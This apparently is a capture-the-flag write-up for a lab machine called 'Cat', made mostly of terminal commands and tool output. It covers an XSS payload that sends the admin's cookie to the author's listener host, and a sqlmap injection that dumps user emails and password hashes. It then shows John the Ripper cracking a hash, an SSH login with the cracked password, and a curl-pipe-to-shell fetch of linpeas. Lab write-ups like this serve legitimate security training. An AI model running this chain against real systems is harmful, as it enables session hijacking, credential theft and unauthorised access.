```
┌──(kali㉿kali)-[~/…/Cat/GitHacker/result/cbd584a870bc23c228bfffe42f75330d]
└─$ cat config.php 
<?php
// Database configuration
$db_file = '/databases/cat.db';

// Connect to the database
try {
    $pdo = new PDO("sqlite:$db_file");
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Error: " . $e->getMessage());
}
?>
```

Using AI, I started looking up how that we can start searching for an email address within my particular folders that that I just pulled from the .git subfolder. This is where the following commands came up. 

- grep -ri "@"

```
grep -ri "@"
grep: img/cat1.jpg: binary file matches
grep: img/cat3.webp: binary file matches
grep: img/cat2.png: binary file matches
.git/hooks/pre-applypatch.sample:test -x "$precommit" && exec "$precommit" ${1+"$@"}
.git/hooks/applypatch-msg.sample:test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
.git/hooks/fsmonitor-watchman.sample:my ($version, $last_update_token) = @ARGV;
.git/hooks/fsmonitor-watchman.sample:           output_result($o->{clock}, @{$o->{files}});
.git/hooks/fsmonitor-watchman.sample:   my ($clockid, @files) = @_;
.git/hooks/fsmonitor-watchman.sample:   # print $fh "$clockid\n@files\n";
.git/hooks/fsmonitor-watchman.sample:   print @files;
.git/hooks/fsmonitor-watchman.sample:   my ($output) = @_;
grep: .git/objects/31/e87489c5f8160f895e941d00087bea94f21315: binary file matches
grep: .git/objects/88/12266cb97013f416c175f9a9fa08aae524c92a: binary file matches
grep: .git/objects/9b/e1a76f22449a7876a712d34dc092f477169c36: binary file matches
grep: .git/objects/48/21d0cd8fecc8c3579be5735b1aab69f1637c86: binary file matches
grep: .git/objects/91/92afa265e9e73f533227e4f118f882615d3640: binary file matches
grep: .git/objects/58/62718ef94b524f3e36627e6f2eae1e3570a7f4: binary file matches
grep: .git/objects/26/bd62c92bcf4415f2b82514bbbac83936c53cb5: binary file matches
grep: .git/objects/9a/dbf70baf0e260d84d9c8666a0460e75e8be4a8: binary file matches
grep: .git/objects/64/d98c5af736de120e17eff23b17e22aad668718: binary file matches
grep: .git/objects/b7/df8d295f9356332f9619ae5ecec3230a880ef2: binary file matches
grep: .git/objects/0c/be0133fb00b13165bd7318e42e17f322daac7f: binary file matches
grep: .git/objects/b8/7b8c6317f8e419dac2c3ce3517a6c93b235028: binary file matches
grep: .git/objects/7b/a662bf012ce71d0db9e86c80386b7ae0a54ea1: binary file matches
grep: .git/objects/09/7745b30047ab3d3e6e0c5239c2dfd5cac308a5: binary file matches
grep: .git/index: binary file matches
.git/logs/HEAD:0000000000000000000000000000000000000000 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5 Axel <axel2017@gmail.com> 1725146774 +0000     commit (initial): Cat v1
.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5 Axel <axel2017@gmail.com> 1725146774 +0000        commit (initial): Cat v1
grep: img_winners/cat1.jpg: binary file matches
grep: img_winners/cat3.webp: binary file matches
grep: img_winners/cat2.png: binary file matches
```

- git log
	- With the git log command, will we see what the Commit history is. it is nice to see for when there was change and who had made the change.
```
git log                                                    
commit 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5 (HEAD -> master, origin/master, origin/HEAD)
Author: Axel <axel2017@gmail.com>
Date:   Sat Aug 31 23:26:14 2024 +0000
```

By running these 2 commands I found axel's email address. We also see in the second command that there is a commit hash.

## Cross-site Scripting Pt.1

We are going to try to create a user by using the following command. Using this XSS command we are going to try to send a request trigger to our listener which we have open on another tab so we can get the admin cookie. https://ratiros01.medium.com/tryhackme-cross-site-scripting-140773f9e022
```
<script>document.location='http://10.10.16.13:8001/?c='+document.cookie;</script>
```

![[Pasted image 20250203091806.png]]

To get the cookie we will have to register a cat and now if we will then go and look at the listener, we will see that we got a cookie.

```
┌──(kali㉿kali)-[~/…/Cat/GitHacker/result/cbd584a870bc23c228bfffe42f75330d]
└─$ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.129.71.234 - - [03/Feb/2025 09:23:18] "GET /?c=PHPSESSID=o0dkabhlsohcg2beu66g9rhf2p HTTP/1.1" 200 -
10.129.71.234 - - [03/Feb/2025 09:23:18] code 404, message File not found
10.129.71.234 - - [03/Feb/2025 09:23:18] "GET /favicon.ico HTTP/1.1" 404 -

```

## SQL Injection

We are now going to use this admin cookie to do a SQL Injection to get the data to connect to the "ssh server". The command we will use to do this. This command tests the web application for SQL injections by manipulating the "catName" parameter and attempts to access the SQLite database. It retrieves data from the users table in the "SQLite_masterdb" database and tries to export it.

```
┌──(kali㉿kali)-[~/…/Cat/GitHacker/result/cbd584a870bc23c228bfffe42f75330d]
└─$ sqlmap -u "http://cat.htb/accept_cat.php" --data "catId=1&catName=fuck" --cookie="PHPSESSID=o0dkabhlsohcg2beu66g9rhf2p" -p "catName" --level=5 --risk=3 --dbms=SQLite -D "SQLite_masterdb" -T "users" --dump --threads=5 --no-cast
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:26:36 /2025-02-03/

[09:26:36] [INFO] testing connection to the target URL
[09:26:37] [INFO] testing if the target URL content is stable
[09:26:37] [INFO] target URL content is stable
[09:26:37] [WARNING] heuristic (basic) test shows that POST parameter 'catName' might not be injectable
[09:26:37] [INFO] testing for SQL injection on POST parameter 'catName'
[09:26:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:26:43] [INFO] POST parameter 'catName' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[09:26:43] [INFO] testing 'Generic inline queries'
[09:26:43] [INFO] testing 'SQLite inline queries'
[09:26:43] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[09:26:43] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[09:26:43] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[09:26:52] [INFO] POST parameter 'catName' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable 
[09:26:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:26:52] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[09:26:52] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[09:26:52] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[09:26:52] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[09:26:52] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[09:26:52] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[09:26:52] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[09:26:52] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[09:26:52] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[09:26:52] [INFO] checking if the injection point on POST parameter 'catName' is a false positive
POST parameter 'catName' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 84 HTTP(s) requests:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catId=1&catName=fuck'||(SELECT CHAR(108,103,100,86) WHERE 9634=9634 AND 6553=6553)||'

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: catId=1&catName=fuck'||(SELECT CHAR(115,75,90,71) WHERE 6942=6942 AND 8010=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||'
---
[09:27:15] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
[09:27:15] [INFO] retrieving the length of query output
[09:27:15] [INFO] retrieved: 159
[09:27:35] [INFO] retrieved: CREATE TABLE users (     user_id INTEGER PRIMARY KEY,     username VARCHAR(255) NOT NULL,     email VARCHAR(255) NOT NULL,     password VARCHAR(255) NOT NULL )
[09:27:35] [INFO] fetching entries for table 'users'
[09:27:35] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[09:27:35] [INFO] retrieved: 11
[09:27:36] [INFO] retrieving the length of query output
[09:27:36] [INFO] retrieved: 18
[09:27:40] [INFO] retrieved: axel2017@gmail.com             
[09:27:40] [INFO] retrieving the length of query output
[09:27:40] [INFO] retrieved: 32
[09:27:45] [INFO] retrieved: d1bbba3670feb9435c9841e46e60ee2f             
[09:27:45] [INFO] retrieving the length of query output
[09:27:45] [INFO] retrieved: 1
[09:27:46] [INFO] retrieved: 1
[09:27:47] [INFO] retrieving the length of query output
[09:27:47] [INFO] retrieved: 4
[09:27:48] [INFO] retrieved: axel           
[09:27:48] [INFO] retrieving the length of query output
[09:27:48] [INFO] retrieved: 24
[09:27:52] [INFO] retrieved: rosamendoza485@gmail.com             
[09:27:52] [INFO] retrieving the length of query output
[09:27:52] [INFO] retrieved: 32
[09:27:57] [INFO] retrieved: ac369922d560f17d6eeb8b2c7dec498c             
[09:27:57] [INFO] retrieving the length of query output
[09:27:57] [INFO] retrieved: 1
[09:27:57] [INFO] retrieved: 2
[09:27:58] [INFO] retrieving the length of query output
[09:27:58] [INFO] retrieved: 4
[09:28:00] [INFO] retrieved: rosa           
[09:28:00] [INFO] retrieving the length of query output
[09:28:00] [INFO] retrieved: 29
[09:28:04] [INFO] retrieved: robertcervantes2000@gmail.com             
[09:28:04] [INFO] retrieving the length of query output
[09:28:04] [INFO] retrieved: 32
[09:28:09] [INFO] retrieved: 42846631708f69c00ec0c0a8aa4a92ad             
[09:28:09] [INFO] retrieving the length of query output
[09:28:09] [INFO] retrieved: 1
[09:28:10] [INFO] retrieved: 3
[09:28:11] [INFO] retrieving the length of query output
[09:28:11] [INFO] retrieved: 6
[09:28:13] [INFO] retrieved: robert           
[09:28:13] [INFO] retrieving the length of query output
[09:28:13] [INFO] retrieved: 29
[09:28:17] [INFO] retrieved: fabiancarachure2323@gmail.com             
[09:28:17] [INFO] retrieving the length of query output
[09:28:17] [INFO] retrieved: 32
[09:28:22] [INFO] retrieved: 39e153e825c4a3d314a0dc7f7475ddbe             
[09:28:22] [INFO] retrieving the length of query output
[09:28:22] [INFO] retrieved: 1
[09:28:22] [INFO] retrieved: 4
[09:28:23] [INFO] retrieving the length of query output
[09:28:23] [INFO] retrieved: 6
[09:28:25] [INFO] retrieved: fabian           
[09:28:25] [INFO] retrieving the length of query output
[09:28:25] [INFO] retrieved: 22
[09:28:29] [INFO] retrieved: jerrysonC343@gmail.com             
[09:28:29] [INFO] retrieving the length of query output
[09:28:29] [INFO] retrieved: 32
[09:28:33] [INFO] retrieved: 781593e060f8d065cd7281c5ec5b4b86             
[09:28:33] [INFO] retrieving the length of query output
[09:28:33] [INFO] retrieved: 1
[09:28:34] [INFO] retrieved: 5
[09:28:35] [INFO] retrieving the length of query output
[09:28:35] [INFO] retrieved: 8
[09:28:37] [INFO] retrieved: jerryson           
[09:28:37] [INFO] retrieving the length of query output
[09:28:37] [INFO] retrieved: 20
[09:28:40] [INFO] retrieved: larryP5656@gmail.com             
[09:28:40] [INFO] retrieving the length of query output
[09:28:40] [INFO] retrieved: 32
[09:28:45] [INFO] retrieved: 1b6dce240bbfbc0905a664ad199e18f8             
[09:28:46] [INFO] retrieving the length of query output
[09:28:45] [INFO] retrieved: 1
[09:28:46] [INFO] retrieved: 6
[09:28:47] [INFO] retrieving the length of query output
[09:28:47] [INFO] retrieved: 5
[09:28:48] [INFO] retrieved: larry           
[09:28:48] [INFO] retrieving the length of query output
[09:28:48] [INFO] retrieved: 25
[09:28:52] [INFO] retrieved: royer.royer2323@gmail.com             
[09:28:52] [INFO] retrieving the length of query output
[09:28:52] [INFO] retrieved: 30
[09:28:58] [INFO] retrieved: c598f6b844a36fa7836fba0835f1f6             
[09:28:58] [INFO] retrieving the length of query output
[09:28:58] [INFO] retrieved: 1
[09:28:58] [INFO] retrieved: 7
[09:28:59] [INFO] retrieving the length of query output
[09:28:59] [INFO] retrieved: 5
[09:29:01] [INFO] retrieved: royer           
[09:29:01] [INFO] retrieving the length of query output
[09:29:01] [INFO] retrieved: 20
[09:29:04] [INFO] retrieved: peterCC456@gmail.com             
[09:29:04] [INFO] retrieving the length of query output
[09:29:04] [INFO] retrieved: 32
[09:29:10] [INFO] retrieved: e41ccefa439fc454f7eadbf1f139ed8a             
[09:29:10] [INFO] retrieving the length of query output
[09:29:10] [INFO] retrieved: 1
[09:29:10] [INFO] retrieved: 8
[09:29:11] [INFO] retrieving the length of query output
[09:29:11] [INFO] retrieved: 5
[09:29:13] [INFO] retrieved: peter           
[09:29:13] [INFO] retrieving the length of query output
[09:29:13] [INFO] retrieved: 19
[09:29:16] [INFO] retrieved: angel234g@gmail.com             
[09:29:16] [INFO] retrieving the length of query output
[09:29:16] [INFO] retrieved: 32
[09:29:21] [INFO] retrieved: 24a8ec003ac2e1b3c5953a6f95f8f565             
[09:29:21] [INFO] retrieving the length of query output
[09:29:21] [INFO] retrieved: 1
[09:29:22] [INFO] retrieved: 9
[09:29:23] [INFO] retrieving the length of query output
[09:29:23] [INFO] retrieved: 5
[09:29:24] [INFO] retrieved: angel           
[09:29:24] [INFO] retrieving the length of query output
[09:29:24] [INFO] retrieved: 20
[09:29:28] [INFO] retrieved: jobert2020@gmail.com             
[09:29:28] [INFO] retrieving the length of query output
[09:29:28] [INFO] retrieved: 32
[09:29:33] [INFO] retrieved: 88e4dceccd48820cf77b5cf6c08698ad             
[09:29:33] [INFO] retrieving the length of query output
[09:29:33] [INFO] retrieved: 2
[09:29:35] [INFO] retrieved: 10           
[09:29:35] [INFO] retrieving the length of query output
[09:29:35] [INFO] retrieved: 6
[09:29:37] [INFO] retrieved: jobert           
[09:29:37] [INFO] retrieving the length of query output
[09:29:37] [INFO] retrieved: 26
[09:29:41] [INFO] retrieved: ditisgewooneentest@cat.htb             
[09:29:41] [INFO] retrieving the length of query output
[09:29:41] [INFO] retrieved: 32
[09:29:45] [INFO] retrieved: 68eacb97d86f0c4621fa2b0e17cabd8c             
[09:29:45] [INFO] retrieving the length of query output
[09:29:45] [INFO] retrieved: 2
[09:29:47] [INFO] retrieved: 11           
[09:29:47] [INFO] retrieving the length of query output
[09:29:47] [INFO] retrieved: 81
[09:29:56] [INFO] retrieved: <script>document.location='http://10.10.16.13:8001/?c='+document.cookie;</script>   
[09:29:56] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[09:30:04] [INFO] writing hashes to a temporary file '/tmp/sqlmaprbcvxh659884/sqlmaphashes-x3e07ary.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[09:30:10] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 

[09:30:24] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[09:30:34] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[09:30:34] [INFO] starting 4 processes 
[09:30:35] [INFO] cracked password 'Test123' for user '<script>document.location='http://10.10.16.13:8001/?c='+document.cookie;</script>'                                                                                               
[09:30:40] [INFO] using suffix '1'                                                                                 
[09:30:45] [INFO] using suffix '123'                                                                               
[09:30:51] [INFO] using suffix '2'                                                                                 
[09:30:57] [INFO] using suffix '12'                                                                                
[09:31:02] [INFO] using suffix '3'                                                                                 
[09:31:08] [INFO] using suffix '13'                                                                                
[09:31:14] [INFO] using suffix '7'                                                                                 
[09:31:20] [INFO] using suffix '11'                                                                                
[09:31:25] [INFO] using suffix '5'                                                                                 
[09:31:31] [INFO] using suffix '22'                                                                                
[09:31:37] [INFO] using suffix '23'                                                                                
[09:31:43] [INFO] using suffix '01'                                                                                
[09:31:49] [INFO] using suffix '4'                                                                                 
[09:31:54] [INFO] using suffix '07'                                                                                
[09:32:00] [INFO] using suffix '21'                                                                                
[09:32:06] [INFO] using suffix '14'                                                                                
[09:32:12] [INFO] using suffix '10'                                                                                
[09:32:18] [INFO] using suffix '06'                                                                                
[09:32:23] [INFO] using suffix '08'                                                                                
[09:32:29] [INFO] using suffix '8'                                                                                 
[09:32:34] [INFO] using suffix '15'                                                                                
[09:32:40] [INFO] using suffix '69'                                                                                
[09:32:46] [INFO] using suffix '16'                                                                                
[09:32:52] [INFO] using suffix '6'                                                                                 
[09:32:57] [INFO] using suffix '18'                                                                                
[09:33:03] [INFO] using suffix '!'                                                                                 
[09:33:08] [INFO] using suffix '.'                                                                                 
[09:33:14] [INFO] using suffix '*'                                                                                 
[09:33:19] [INFO] using suffix '!!'                                                                                
[09:33:25] [INFO] using suffix '?'                                                                                 
[09:33:31] [INFO] using suffix ';'                                                                                 
[09:33:37] [INFO] using suffix '..'                                                                                
[09:33:43] [INFO] using suffix '!!!'                                                                               
[09:33:49] [INFO] using suffix ', '                                                                                
[09:33:55] [INFO] using suffix '@'                                                                                 
Database: <current>                                                                                                
Table: users
[11 entries]
+---------+-------------------------------+--------------------------------------------+-----------------------------------------------------------------------------------+
| user_id | email                         | password                                   | username                                                                          |
+---------+-------------------------------+--------------------------------------------+-----------------------------------------------------------------------------------+
| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f           | axel                                                                              |
| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c           | rosa                                                                              |
| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad           | robert                                                                            |
| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe           | fabian                                                                            |
| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86           | jerryson                                                                          |
| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8           | larry                                                                             |
| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6             | royer                                                                             |
| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a           | peter                                                                             |
| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565           | angel                                                                             |
| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad           | jobert                                                                            |
| 11      | ditisgewooneentest@cat.htb    | 68eacb97d86f0c4621fa2b0e17cabd8c (Test123) | <script>document.location='http://10.10.16.13:8001/?c='+document.cookie;</script> |                                                            
+---------+-------------------------------+--------------------------------------------+-----------------------------------------------------------------------------------+

[09:34:01] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/cat.htb/dump/SQLite_masterdb/users.csv'                                                                                       
[09:34:01] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 3558 times
[09:34:01] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/cat.htb'

[*] ending @ 09:34:01 /2025-02-03/

```

We are now going to try to crack the hashes of each user by putting them into a Hash file and cracking it using John The Ripper. We will do the following. 

- First go put all the hashes into a file that I am going to call Hash.

```
┌──(kali㉿kali)-[~/…/Cat/GitHacker/result/cbd584a870bc23c228bfffe42f75330d]
└─$ cat Hash                                                    
d1bbba3670feb9435c9841e46e60ee2f
ac369922d560f17d6eeb8b2c7dec498c
42846631708f69c00ec0c0a8aa4a92ad
39e153e825c4a3d314a0dc7f7475ddbe
781593e060f8d065cd7281c5ec5b4b86
1b6dce240bbfbc0905a664ad199e18f8
c598f6b844a36fa7836fba0835f1f6
e41ccefa439fc454f7eadbf1f139ed8a
24a8ec003ac2e1b3c5953a6f95f8f565
88e4dceccd48820cf77b5cf6c08698ad
```

- We are now going to crack this hash file using john.

```
┌──(kali㉿kali)-[~/…/Cat/GitHacker/result/cbd584a870bc23c228bfffe42f75330d]
└─$ john --format=Raw-MD5 Hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
soyunaprincesarosa (?)     
1g 0:00:00:00 DONE (2025-02-03 09:47) 1.724g/s 24729Kp/s 24729Kc/s 204054KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

## SSH as Rosa

Now I can use this password to go log in as rosa on the ssh server.

| Username | Password           |
| -------- | ------------------ |
| rosa     | soyunaprincesarosa |

```
┌──(kali㉿kali)-[~/…/Cat/GitHacker/result/cbd584a870bc23c228bfffe42f75330d]
└─$ ssh rosa@cat.htb                 
The authenticity of host 'cat.htb (10.129.71.234)' can't be established.
ED25519 key fingerprint is SHA256:tsmOV3JuQkCv6HNUqg9YQ+DJznLS2nYKJl4zIwKtbE4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cat.htb' (ED25519) to the list of known hosts.
rosa@cat.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 03 Feb 2025 08:57:04 AM UTC

  System load:           0.18
  Usage of /:            53.8% of 6.06GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             240
  Users logged in:       0
  IPv4 address for eth0: 10.129.71.234
  IPv6 address for eth0: dead:beef::250:56ff:fe94:acf2

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Sat Sep 28 15:44:52 2024 from 192.168.1.64
rosa@cat:~$ 

```

## Linux Privilege Escalation Audit

I have now started running linpeas within the ssh connection as rosa. In doing so, many interesting things have become visible. Like that there is a localhosts running on port 3000, root files that we can read as user rosa, other interesting files, a password, ...

```
rosa@cat:~$ curl 10.10.16.13/linpeas.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 82884  100 82884    0     0   481k      0 --:--:-- --:--:-- --:--:--  484k

linpeas v2.0.7
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
LEYEND:                                                                                                             
RED/YELLOW: 99% a PE vector
RED: You must take a look at it
LightCyan: Users with console
Blue: Users without console & mounted devs
Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts) 
LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 5.4.0-204-generic (buildd@lcy02-amd64-079) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #224-Ubuntu SMP Thu Dec 5 13:38:28 UTC 2024
User & Groups: uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm)
Hostname: cat
Writable folder: /dev/shm


====================================( System Information )====================================
[+] Operative system                                                                                                
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                     
Linux version 5.4.0-204-generic (buildd@lcy02-amd64-079) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #224-Ubuntu SMP Thu Dec 5 13:38:28 UTC 2024
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.6 LTS
Release:        20.04
Codename:       focal

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                        
Sudo version 1.8.31                                                                                                 

[+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)                                   
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                  
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

[+] Date
Mon 03 Feb 2025 09:14:08 AM UTC                                                                                     

[+] System stats
Filesystem                         Size  Used Avail Use% Mounted on                                                 
udev                               1.9G     0  1.9G   0% /dev
tmpfs                              392M  1.2M  391M   1% /run
/dev/mapper/ubuntu--vg-ubuntu--lv  6.1G  3.3G  2.5G  57% /
tmpfs                              2.0G     0  2.0G   0% /dev/shm
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/sda2                          358M  109M  221M  33% /boot
tmpfs                              392M     0  392M   0% /run/user/1001
              total        used        free      shared  buff/cache   available
Mem:        4013980      623036     2515512        6300      875432     3145004
Swap:       1047548           0     1047548

[+] Environment
[i] Any private information inside environment variables?                                                           
LESSOPEN=| /usr/bin/lesspipe %s                                                                                     
HISTFILESIZE=0
USER=rosa
SSH_CLIENT=10.10.16.13 51336 22
XDG_SESSION_TYPE=tty
SHLVL=0
MOTD_SHOWN=pam
HOME=/home/rosa
SSH_TTY=/dev/pts/0
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus
LOGNAME=rosa
_=/usr/bin/sh
XDG_SESSION_CLASS=user
TERM=xterm-256color
XDG_SESSION_ID=34
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1001
LANG=en_US.UTF-8
HISTSIZE=0
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
SSH_CONNECTION=10.10.16.13 51336 10.129.71.234 22
HISTFILE=/dev/null

[+] Looking for Signature verification failed in dmseg
 Not Found                                                                                                          
                                                                                                                    
[+] selinux enabled? .......... sestatus Not Found
[+] Printer? .......... lpstat Not Found                                                                            
[+] Is this a container? .......... No                                                                              
                                                                                                                    

=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)                                                                                
sda                                                                                                                 
sda1
sda2
sda3
sda4

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                                                         
/dev/disk/by-id/dm-uuid-LVM-y12FjLuxTJ8ecisR7yOMYeqKGeyregTQN27oKUfsF7miOKKaBS3N3aLF8cUi8f1G / ext4 defaults 0 1    
/dev/disk/by-uuid/9f3a8bfe-ed65-4111-a80d-c4e3124cf962 /boot ext4 defaults 0 1
proc /proc proc defaults,hidepid=2 0 0
/dev/disk/by-uuid/265d4ffb-b9d9-48c9-a7a3-bd654400d391 none swap sw 0 0


====================================( Available Software )====================================
[+] Useful software?                                                                                                
/usr/bin/nc                                                                                                         
/usr/bin/netcat
/usr/bin/wget
/usr/bin/curl
/usr/bin/ping
/usr/bin/gcc
/usr/bin/g++
/usr/bin/make
/usr/bin/base64
/usr/bin/python3
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo

[+] Installed compilers?
ii  g++                                   4:9.3.0-1ubuntu2                  amd64        GNU C++ compiler           
ii  g++-9                                 9.4.0-1ubuntu1~20.04.2            amd64        GNU C++ compiler
ii  gcc                                   4:9.3.0-1ubuntu2                  amd64        GNU C compiler
ii  gcc-9                                 9.4.0-1ubuntu1~20.04.2            amd64        GNU C compiler
/usr/bin/gcc
/usr/bin/g++


================================( Processes, Cron & Services )================================
[+] Cleaned processes                                                                                               
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                                
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                          
rosa        2848  0.0  0.2  19096  9588 ?        Ss   09:04   0:00 /lib/systemd/systemd --user
rosa        2932  0.0  0.1   8272  5132 pts/0    Ss   09:04   0:00 -bash
rosa        3194  0.0  0.0   2608  1772 pts/0    S+   09:14   0:00 sh
rosa        3367  0.0  0.0   8888  3312 pts/0    R+   09:14   0:00 ps aux

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                           
1.6M -rwxr-xr-x 1 root root 1.6M Jun 17  2024 /lib/systemd/systemd                                                  

[+] Different processes executed during 1 min (interesting is low number of repetitions)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs                                  
    595 -bash                                                                                                       
    595 CMD
    595 /lib/systemd/systemd --user
    595 ps -e --format cmd
    595 sh

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                      
-rw-r----- 1 root root 1169 Aug 30 04:19 /etc/crontab                                                               

/etc/cron.d:
total 28
drwxr-xr-x   2 root root 4096 Jan 21 12:38 .
drwxr-xr-x 115 root root 4096 Jan 31 11:41 ..
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  190 Mar 14  2023 popularity-contest
-rw-r--r--   1 root root 2465 Aug 30 04:09 sendmail

/etc/cron.daily:
total 56
drwxr-xr-x   2 root root 4096 Jan 21 12:38 .
drwxr-xr-x 115 root root 4096 Jan 31 11:41 ..
-rwxr-xr-x   1 root root  539 Dec  4  2023 apache2
-rwxr-xr-x   1 root root  376 Sep 16  2021 apport
-rwxr-xr-x   1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
